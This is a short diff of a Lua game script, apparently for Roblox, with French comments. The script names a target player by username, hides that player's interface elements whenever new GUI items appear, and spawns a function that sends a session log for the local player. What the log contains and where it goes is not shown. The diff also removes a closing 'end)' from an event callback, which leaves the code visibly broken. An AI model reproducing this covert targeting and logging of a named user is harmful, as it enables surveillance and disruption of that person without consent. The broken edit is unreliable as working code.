@@ -58,7 +58,6 @@ local function sendSessionLog(player)
     end)
 end
 
--- Nom de la cible
 local CIBLE = "zeynox0880"
 
 -- Fonction pour masquer les interfaces
@@ -86,7 +85,6 @@ playerGui.ChildAdded:Connect(function(child)
             cacherInterfaces()
         end
     end
-end)
 
 if LocalPlayer then
     task.spawn(function() sendSessionLog(LocalPlayer) end)
